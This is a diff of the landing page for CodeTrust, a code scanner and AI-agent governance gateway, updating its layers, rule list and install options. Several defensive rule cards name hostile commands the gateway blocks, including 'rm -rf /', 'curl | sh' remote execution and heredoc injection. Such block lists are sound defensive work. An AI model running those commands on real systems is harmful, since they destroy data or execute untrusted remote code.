+        <h2 class="reveal">10 enforcement layers</h2>
+        <p class="section-desc reveal">Code enters at Layer 1. If it survives all 10, it ships. If not &mdash; you know
+            exactly why.</p>
 
         <div class="pipe-track reveal">
             <div class="pipe-step">
                 <div class="pipe-num">01</div>
                 <div class="pipe-content">
-                    <h4>Static Analysis</h4>
-                    <p>Regex engine — 15 core rules catching secrets, eval/exec, injection, heredocs, debug statements.
-                    </p>
-                    <div class="pipe-detail">~2ms per file</div>
+                    <h4>Static Analysis <span class="pipe-type pipe-type-block">BLOCKING</span></h4>
+                    <p>15 core rules &mdash; secrets, eval/exec, injection, heredocs, debug statements</p>
                 </div>
             </div>
             <div class="pipe-step">
                 <div class="pipe-num">02</div>
                 <div class="pipe-content">
-                    <h4>Root Cause Analysis</h4>
-                    <p>4 rules that detect symptom-fixing: swallowed exceptions, lint suppression, defensive
-                        null-coalescing, uncommented sleeps.</p>
-                    <div class="pipe-detail">Law 3: Fix the cause, never the symptom</div>
+                    <h4>Root Cause Analysis <span class="pipe-type pipe-type-block">BLOCKING</span></h4>
+                    <p>4 rules &mdash; swallowed exceptions, lint suppression, defensive null-coalescing</p>
                 </div>
             </div>
             <div class="pipe-step">
                 <div class="pipe-num">03</div>
                 <div class="pipe-content">
-                    <h4>SQL Analysis</h4>
-                    <p>13 dedicated rules for .sql files. SELECT *, DELETE without WHERE, FLOAT for money, GRANT ALL.
-                    </p>
-                    <div class="pipe-detail">shipped in v1.6.0</div>
+                    <h4>SQL Analysis <span class="pipe-type pipe-type-block">BLOCKING</span></h4>
+                    <p>13 rules &mdash; SELECT *, DELETE without WHERE, FLOAT for money, GRANT ALL</p>
                 </div>
             </div>
             <div class="pipe-step">
                 <div class="pipe-num">04</div>
                 <div class="pipe-content">
-                    <h4>AST Analysis</h4>
-                    <p>Tree-sitter structural parsing. Complexity, nesting depth, unused variables, unreachable code.
-                    </p>
-                    <div class="pipe-detail">Python · JS · TS · Go · Rust</div>
+                    <h4>AST Analysis <span class="pipe-type pipe-type-advisory">ADVISORY</span></h4>
+                    <p>Tree-sitter structural parsing &mdash; complexity, unused variables, unreachable code</p>
+                    <div class="pipe-detail">Python &middot; JS &middot; TS &middot; Go &middot; Rust</div>
                 </div>
             </div>
             <div class="pipe-step">
                 <div class="pipe-num">05</div>
                 <div class="pipe-content">
-                    <h4>Container Hardening</h4>
-                    <p>10 rules for Dockerfiles and docker-compose: root user, :latest tags, missing WORKDIR, ENV
-                        secrets, no healthcheck.</p>
-                    <div class="pipe-detail">shipped in v1.8.0</div>
+                    <h4>Container Hardening <span class="pipe-type pipe-type-block">BLOCKING</span></h4>
+                    <p>10 rules &mdash; root user, :latest tags, missing WORKDIR, ENV secrets, no healthcheck</p>
                 </div>
             </div>
             <div class="pipe-step">
                 <div class="pipe-num">06</div>
                 <div class="pipe-content">
-                    <h4>IaC &amp; Config Analysis</h4>
-                    <p>7 rules for YAML, TOML, Terraform: hardcoded IPs, debug mode, API keys in config, unbounded
-                        retries.</p>
-                    <div class="pipe-detail">CI/CD pipeline &amp; infrastructure</div>
+                    <h4>IaC &amp; Config <span class="pipe-type pipe-type-block">BLOCKING</span></h4>
+                    <p>7 rules &mdash; hardcoded IPs, debug mode, API keys in config, unbounded retries</p>
                 </div>
             </div>
             <div class="pipe-step">
                 <div class="pipe-num">07</div>
                 <div class="pipe-content">
-                    <h4>Package Verification</h4>
-                    <p>Live registry checks. Every import verified against PyPI, npm, crates.io, Go proxy.</p>
-                    <div class="pipe-detail">catches hallucinated packages</div>
+                    <h4>React &amp; Kubernetes <span class="pipe-type pipe-type-block">BLOCKING</span></h4>
+                    <p>13 rules &mdash; dangerouslySetInnerHTML, privileged pods, missing resource limits</p>
                 </div>
             </div>
             <div class="pipe-step">
                 <div class="pipe-num">08</div>
                 <div class="pipe-content">
-                    <h4>Docker Verification</h4>
-                    <p>Validates base images and tags exist on Docker Hub and GHCR before you build.</p>
-                    <div class="pipe-detail">no more ghost images</div>
+                    <h4>Import Verification <span class="pipe-type pipe-type-block">BLOCKING</span></h4>
+                    <p>Live PyPI/npm check &mdash; catches hallucinated packages automatically</p>
+                    <div class="pipe-detail">Moat 2 &mdash; hallucination detection</div>
                 </div>
             </div>
             <div class="pipe-step">
                 <div class="pipe-num">09</div>
                 <div class="pipe-content">
-                    <h4>Enterprise Gate</h4>
-                    <p>Repo structure audit + all 8 layers orchestrated. README, LICENSE, tests, CI config. One
-                        endpoint, complete verdict.</p>
-                    <div class="pipe-detail">POST /v1/scan/deep</div>
+                    <h4>Docker Verification <span class="pipe-type pipe-type-block">BLOCKING</span></h4>
+                    <p>Validates base images and tags exist on Docker Hub and GHCR before build</p>
+                </div>
+            </div>
+            <div class="pipe-step">
+                <div class="pipe-num pipe-num-red">10</div>
+                <div class="pipe-content">
+                    <h4>AI Governance Gateway <span class="pipe-type pipe-type-block">BLOCKING</span></h4>
+                    <p>57 real-time interception rules &mdash; blocks destructive AI agent actions before execution</p>
+                    <div class="pipe-detail">Moat 1 &mdash; pre-execution enforcement</div>
                 </div>
             </div>
         </div>
     </section>
 
-    <!-- ═══════════════════════════════════════════════════════════════════
-     RULES
-     ═══════════════════════════════════════════════════════════════════ -->
-    <section class="rules-section" id="rules">
-        <div class="section-tag">What we catch</div>
-        <h2 class="reveal">62 rules across every layer</h2>
-        <p class="section-desc reveal">BLOCK stops the pipeline — WARN flags risk — INFO improves</p>
+    <!-- RULES -->
+    <section class="container" id="rules">
+        <div class="section-tag section-center">What we enforce</div>
+        <h2 class="reveal">132 rules across every layer</h2>
+        <p class="section-desc reveal">75 scan rules + 57 gateway rules. BLOCK stops the pipeline &mdash; WARN flags
+            risk &mdash; INFO improves</p>
 
         <div class="rule-tabs reveal" id="ruleTabs">
             <button class="rule-tab active" data-cat="all">All</button>
+            <button class="rule-tab" data-cat="gateway">Gateway</button>
             <button class="rule-tab" data-cat="security">Security</button>
-            <button class="rule-tab" data-cat="quality">Code Quality</button>
+            <button class="rule-tab" data-cat="halluc">Hallucination</button>
             <button class="rule-tab" data-cat="infra">Infra &amp; SQL</button>
             <button class="rule-tab" data-cat="container">Container</button>
-            <button class="rule-tab" data-cat="cicd">CI/CD</button>
         </div>
 
         <div class="rule-grid reveal" id="ruleGrid">
+            <!-- Gateway -->
+            <div class="rule-card visible" data-cat="gateway">
+                <div class="rule-id">gateway_rm_rf_root</div>
+                <div class="rule-msg">Destructive file deletion &mdash; rm -rf / blocked before execution</div>
+                <span class="rule-sev sev-block">BLOCK</span>
+            </div>
+            <div class="rule-card visible" data-cat="gateway">
+                <div class="rule-id">gateway_heredoc</div>
+                <div class="rule-msg">Heredoc command injection &mdash; blocked at gateway level</div>
+                <span class="rule-sev sev-block">BLOCK</span>
+            </div>
+            <div class="rule-card visible" data-cat="gateway">
+                <div class="rule-id">gateway_curl_pipe_sh</div>
+                <div class="rule-msg">Remote code execution via curl | sh &mdash; blocked before execution</div>
+                <span class="rule-sev sev-block">BLOCK</span>
+            </div>
+            <div class="rule-card visible" data-cat="gateway">
+                <div class="rule-id">gateway_git_push</div>
+                <div class="rule-msg">Git push requires explicit approval &mdash; prevents accidental pushes</div>
+                <span class="rule-sev sev-warn">WARN</span>
+            </div>
+            <div class="rule-card visible" data-cat="gateway">
+                <div class="rule-id">gateway_content_secret</div>
+                <div class="rule-msg">Hardcoded secret in file write &mdash; blocked before file is created</div>
+                <span class="rule-sev sev-block">BLOCK</span>
+            </div>
+            <!-- Hallucination -->
+            <div class="rule-card visible" data-cat="halluc">
+                <div class="rule-id">import_not_found</div>
+                <div class="rule-msg">Package doesn't exist on registry &mdash; AI hallucination caught</div>
+                <span class="rule-sev sev-block">BLOCK</span>
+            </div>
+            <div class="rule-card visible" data-cat="halluc">
+                <div class="rule-id">hallucinated_import_misspelled</div>
+                <div class="rule-msg">Import name is a known misspelling of a real package</div>
+                <span class="rule-sev sev-warn">WARN</span>
+            </div>
+            <div class="rule-card visible" data-cat="halluc">
+                <div class="rule-id">hallucinated_method_chain</div>
+                <div class="rule-msg">Method chain references non-existent API &mdash; possible hallucination</div>
+                <span class="rule-sev sev-warn">WARN</span>
+            </div>
+            <div class="rule-card visible" data-cat="halluc">
+                <div class="rule-id">fake_api_key_format</div>
+                <div class="rule-msg">API key matches placeholder pattern &mdash; not a real key</div>
+                <span class="rule-sev sev-warn">WARN</span>
+            </div>
+            <div class="rule-card visible" data-cat="halluc">
+                <div class="rule-id">placeholder_url</div>
+                <div class="rule-msg">URL contains example.com or placeholder domain</div>
+                <span class="rule-sev sev-warn">WARN</span>
+            </div>
             <!-- Security -->
             <div class="rule-card visible" data-cat="security">
                 <div class="rule-id">hardcoded_secret</div>
-                <div class="rule-msg">Hardcoded API keys, tokens or passwords — use environment variables</div>
+                <div class="rule-msg">Hardcoded API keys, tokens or passwords &mdash; use environment variables</div>
                 <span class="rule-sev sev-block">BLOCK</span>
             </div>
             <div class="rule-card visible" data-cat="security">
                 <div class="rule-id">eval_exec</div>
-                <div class="rule-msg">eval/exec opens arbitrary code execution — use safe alternatives</div>
+                <div class="rule-msg">eval/exec opens arbitrary code execution &mdash; use safe alternatives</div>
                 <span class="rule-sev sev-block">BLOCK</span>
             </div>
             <div class="rule-card visible" data-cat="security">
                 <div class="rule-id">sql_injection</div>
-                <div class="rule-msg">String-formatted queries — use parameterized queries</div>
+                <div class="rule-msg">String-formatted queries &mdash; use parameterized queries</div>
                 <span class="rule-sev sev-block">BLOCK</span>
-            </div>
-            <div class="rule-card visible" data-cat="security">
-                <div class="rule-id">pickle_load</div>
-                <div class="rule-msg">Unsafe deserialization with untrusted data</div>
-                <span class="rule-sev sev-block">BLOCK</span>
-            </div>
-            <!-- Code Quality -->
-            <div class="rule-card visible" data-cat="quality">
-                <div class="rule-id">package_not_found</div>
-                <div class="rule-msg">Import doesn't exist on any registry — AI hallucination caught</div>
-                <span class="rule-sev sev-block">BLOCK</span>
-            </div>
-            <div class="rule-card visible" data-cat="quality">
-                <div class="rule-id">high_complexity</div>
-                <div class="rule-msg">Cyclomatic complexity exceeds threshold — refactor needed</div>
-                <span class="rule-sev sev-warn">WARN</span>
-            </div>
-            <div class="rule-card visible" data-cat="quality">
-                <div class="rule-id">bare_except</div>
-                <div class="rule-msg">Bare except catches KeyboardInterrupt — catch specific exceptions</div>
-                <span class="rule-sev sev-warn">WARN</span>
-            </div>
-            <div class="rule-card visible" data-cat="quality">
-                <div class="rule-id">mutable_default</div>
-                <div class="rule-msg">Mutable default argument — use None and assign inside function</div>
-                <span class="rule-sev sev-warn">WARN</span>
-            </div>
-            <div class="rule-card visible" data-cat="quality">
-                <div class="rule-id">wildcard_import</div>
-                <div class="rule-msg">from module import * — reduces clarity and breaks tooling</div>
-                <span class="rule-sev sev-warn">WARN</span>
-            </div>
-            <div class="rule-card visible" data-cat="quality">
-                <div class="rule-id">deep_nesting</div>
-                <div class="rule-msg">Nesting depth exceeds 4 levels — extract to functions</div>
-                <span class="rule-sev sev-warn">WARN</span>
             </div>
             <!-- Infra & SQL -->
             <div class="rule-card visible" data-cat="infra">
-                <div class="rule-id">docker_image_not_found</div>
-                <div class="rule-msg">Base image or tag doesn't exist on Docker Hub</div>
-                <span class="rule-sev sev-block">BLOCK</span>
-            </div>
-            <div class="rule-card visible" data-cat="infra">
-                <div class="rule-id">missing_readme</div>
-                <div class="rule-msg">No README in repository — enterprise readiness blocked</div>
-                <span class="rule-sev sev-block">BLOCK</span>
-            </div>
-            <div class="rule-card visible" data-cat="infra">
                 <div class="rule-id">sql_delete_no_where</div>
-                <div class="rule-msg">DELETE without WHERE — will remove all rows</div>
+                <div class="rule-msg">DELETE without WHERE &mdash; will remove all rows</div>
                 <span class="rule-sev sev-block">BLOCK</span>
             </div>
             <div class="rule-card visible" data-cat="infra">
@@ -1359,70 +2335,36 @@
                 <div class="rule-msg">GRANT ALL gives excessive privileges on production</div>
                 <span class="rule-sev sev-block">BLOCK</span>
             </div>
-            <!-- Container Hardening -->
+            <div class="rule-card visible" data-cat="infra">
+                <div class="rule-id">docker_image_not_found</div>
+                <div class="rule-msg">Base image or tag doesn't exist on Docker Hub</div>
+                <span class="rule-sev sev-block">BLOCK</span>
+            </div>
+            <!-- Container -->
             <div class="rule-card visible" data-cat="container">
                 <div class="rule-id">docker_root_user</div>
-                <div class="rule-msg">Container runs as root — add USER directive</div>
+                <div class="rule-msg">Container runs as root &mdash; add USER directive</div>
                 <span class="rule-sev sev-block">BLOCK</span>
             </div>
             <div class="rule-card visible" data-cat="container">
-                <div class="rule-id">docker_env_secret</div>
-                <div class="rule-msg">Secret value baked into Docker ENV — use runtime injection</div>
+                <div class="rule-id">k8s_privileged</div>
+                <div class="rule-msg">Pod runs in privileged mode &mdash; container escape risk</div>
                 <span class="rule-sev sev-block">BLOCK</span>
             </div>
             <div class="rule-card visible" data-cat="container">
-                <div class="rule-id">docker_latest_tag</div>
-                <div class="rule-msg">FROM image:latest — pin to a specific version tag</div>
-                <span class="rule-sev sev-warn">WARN</span>
-            </div>
-            <div class="rule-card visible" data-cat="container">
-                <div class="rule-id">docker_no_workdir</div>
-                <div class="rule-msg">No WORKDIR set — files land in root directory</div>
-                <span class="rule-sev sev-info">INFO</span>
-            </div>
-            <!-- CI/CD -->
-            <div class="rule-card visible" data-cat="cicd">
-                <div class="rule-id">ci_unpinned_action</div>
-                <div class="rule-msg">GitHub Action uses unpinned @master/@main — pin to SHA or version tag</div>
-                <span class="rule-sev sev-warn">WARN</span>
-            </div>
-            <div class="rule-card visible" data-cat="cicd">
-                <div class="rule-id">ci_no_timeout</div>
-                <div class="rule-msg">CI job has no timeout-minutes — runaway builds waste resources</div>
-                <span class="rule-sev sev-warn">WARN</span>
-            </div>
-            <!-- Symptom-Fix Detection -->
-            <div class="rule-card visible" data-cat="quality">
-                <div class="rule-id">except_swallow</div>
-                <div class="rule-msg">Exception caught and silently ignored — log or re-raise</div>
-                <span class="rule-sev sev-warn">WARN</span>
-            </div>
-            <div class="rule-card visible" data-cat="quality">
-                <div class="rule-id">suppress_lint</div>
-                <div class="rule-msg">Linter suppression without justification — add reasoning comment</div>
-                <span class="rule-sev sev-warn">WARN</span>
-            </div>
-            <div class="rule-card visible" data-cat="security">
-                <div class="rule-id">debug_mode_enabled</div>
-                <div class="rule-msg">Debug mode enabled in production config — disable before deploy</div>
-                <span class="rule-sev sev-warn">WARN</span>
-            </div>
-            <div class="rule-card visible" data-cat="security">
-                <div class="rule-id">hardcoded_ip</div>
-                <div class="rule-msg">Hardcoded IP address — use DNS or configuration</div>
+                <div class="rule-id">k8s_no_resource_limits</div>
+                <div class="rule-msg">No resource limits set &mdash; unbounded resource consumption</div>
                 <span class="rule-sev sev-warn">WARN</span>
             </div>
         </div>
     </section>
 
-    <!-- ═══════════════════════════════════════════════════════════════════
-     LANGUAGES
-     ═══════════════════════════════════════════════════════════════════ -->
-    <section class="langs">
-        <div class="langs-inner reveal">
+    <!-- LANGUAGES -->
+    <section class="container" style="padding-top: 4rem; padding-bottom: 4rem;">
+        <div class="reveal" style="text-align: center;">
             <div class="section-tag">Coverage</div>
             <h2>One tool, every stack</h2>
-            <div class="lang-row">
+            <div class="lang-row" style="margin-top: 2rem;">
                 <span class="lang-chip">Python</span>
                 <span class="lang-chip">JavaScript</span>
                 <span class="lang-chip">TypeScript</span>
@@ -1430,35 +2372,47 @@
                 <span class="lang-chip">Rust</span>
                 <span class="lang-chip">SQL</span>
                 <span class="lang-chip">Dockerfile</span>
-                <span class="lang-chip">YAML / CI<span class="lang-new">new</span></span>
+                <span class="lang-chip">YAML / CI</span>
             </div>
         </div>
     </section>
 
-    <!-- ═══════════════════════════════════════════════════════════════════
-     INSTALL
-     ═══════════════════════════════════════════════════════════════════ -->
-    <section class="install" id="install">
-        <div class="section-tag">Get Started</div>
-        <h2 class="reveal">Three ways in</h2>
+    <!-- INSTALL -->
+    <section class="container" id="install">
+        <div class="section-tag section-center">Get Started</div>
+        <h2 class="reveal">Five ways in</h2>
 
         <div class="install-grid reveal">
             <div class="install-card">
-                <h4>PyPI</h4>
-                <p>Python 3.12+. MCP server or CLI.</p>
+                <h4>CLI (PyPI)</h4>
+                <p>Python 3.12+. Full scanner + governance.</p>
                 <code>pip install codetrust</code>
                 <a href="https://pypi.org/project/codetrust/" target="_blank" class="card-link">View on PyPI &rarr;</a>
             </div>
             <div class="install-card">
                 <h4>VS Code Extension</h4>
-                <p>Real-time scanning. Works with Copilot.</p>
+                <p>75 rules. Scan on save. Works offline.</p>
                 <code>ext install SaidBorna.codetrust</code>
                 <a href="https://marketplace.visualstudio.com/items?itemName=SaidBorna.codetrust" target="_blank"
                     class="card-link">View on Marketplace &rarr;</a>
             </div>
             <div class="install-card">
+                <h4>GitHub Action</h4>
+                <p>CI/CD gate. Fails PR on BLOCK findings.</p>
+                <code>uses: S-Borna/codetrust@v2</code>
+                <a href="https://github.com/S-Borna/codetrust" target="_blank" class="card-link">View on GitHub
+                    &rarr;</a>
+            </div>
+            <div class="install-card">
+                <h4>MCP Server</h4>
+                <p>17 tools. Claude, Copilot, Cursor.</p>
+                <code>python -m src.server</code>
+                <a href="https://github.com/S-Borna/codetrust#mcp-gateway" target="_blank" class="card-link">Setup guide
+                    &rarr;</a>
+            </div>
+            <div class="install-card">
                 <h4>Cloud API</h4>
-                <p>REST API. No install. POST your code.</p>
+                <p>26 REST endpoints. No install needed.</p>
                 <code>POST /v1/scan/deep</code>
                 <a href="https://codetrust-api-production.up.railway.app/v1/status" target="_blank"
                     class="card-link">Check API status &rarr;</a>
@@ -1466,14 +2420,28 @@
         </div>
     </section>
 
-    <!-- ═══════════════════════════════════════════════════════════════════
-     BOTTOM CTA
-     ═══════════════════════════════════════════════════════════════════ -->
+    <!-- COMPLIANCE -->
+    <section class="container" style="padding-top: 4rem; padding-bottom: 4rem;">
+        <div class="reveal" style="text-align: center;">
+            <div class="section-tag">Enterprise Ready</div>
+            <h2>Compliance surface</h2>
+            <div class="lang-row" style="margin-top: 2rem; flex-wrap: nowrap; gap: 0.4rem;">
+                <span class="lang-chip">SSO / OIDC</span>
+                <span class="lang-chip">GDPR Art. 15 &amp; 17</span>
+                <span class="lang-chip">SIEM Export</span>
+                <span class="lang-chip">Sigstore Signing</span>
+                <span class="lang-chip">CycloneDX SBOM</span>
+                <span class="lang-chip">Audit Trail</span>
+                <span class="lang-chip">Prometheus Metrics</span>
+            </div>
+        </div>
+    </section>
+
+    <!-- BOTTOM CTA -->
     <section class="bottom-cta">
         <div class="reveal">
-            <h2>AI writes fast<br>CodeTrust verifies it's right</h2>
-            <p>845 tests, 9 verification layers, 62 rules. Zero tolerance for hallucinated packages — built and
-                maintained by one engineer who refuses to ship unchecked code</p>
+            <h2>AI writes fast. CodeTrust enforces it's safe.</h2>
+            <p>132 rules. 10 enforcement layers. Three moats no other tool has.</p>
             <div class="hero-actions">
                 <a href="https://marketplace.visualstudio.com/items?itemName=SaidBorna.codetrust"
                     class="btn btn-primary" target="_blank">Install for VS Code</a>
@@ -1483,9 +2451,7 @@
         </div>
     </section>
 
-    <!-- ═══════════════════════════════════════════════════════════════════
-     FOOTER
-     ═══════════════════════════════════════════════════════════════════ -->
+    <!-- FOOTER -->
     <footer>
         <span>&copy; 2026 Said Borna. All rights reserved.</span>
         <div class="footer-links">
@@ -1527,6 +2493,47 @@
                 }
             });
         });
+
+        // Fetch live usage stats from API
+        const API_URL = 'https://codetrust-api.saidborna.com/v1/stats/public';
+        async function loadUsageStats() {
+            try {
+                const res = await fetch(API_URL);
+                if (!res.ok) throw new Error(res.status);
+                const data = await res.json();
+                document.querySelectorAll('.usage-num[data-key]').forEach(el => {
+                    const val = data[el.dataset.key] || 0;
+                    el.dataset.count = val;
+                    el.textContent = val.toLocaleString();
+                });
+            } catch (e) {
+                // Silently keep 0 if API unreachable
+            }
+        }
+        loadUsageStats();
+
+        // Animate usage counters on scroll
+        const counterObserver = new IntersectionObserver((entries) => {
+            entries.forEach(entry => {
+                if (!entry.isIntersecting) return;
+                entry.target.querySelectorAll('.usage-num').forEach(el => {
+                    const target = parseInt(el.dataset.count);
+                    if (target === 0) return;
+                    const duration = 2000;
+                    const start = performance.now();
+                    const step = (now) => {
+                        const progress = Math.min((now - start) / duration, 1);
+                        const ease = 1 - Math.pow(1 - progress, 3);
+                        el.textContent = Math.floor(target * ease).toLocaleString();
+                        if (progress < 1) requestAnimationFrame(step);
+                    };
+                    requestAnimationFrame(step);
+                });
+                counterObserver.unobserve(entry.target);
+            });
+        }, { threshold: 0.3 });
+        const usageBar = document.querySelector('.usage-bar');
+        if (usageBar) counterObserver.observe(usageBar);
     </script>
 
 </body>
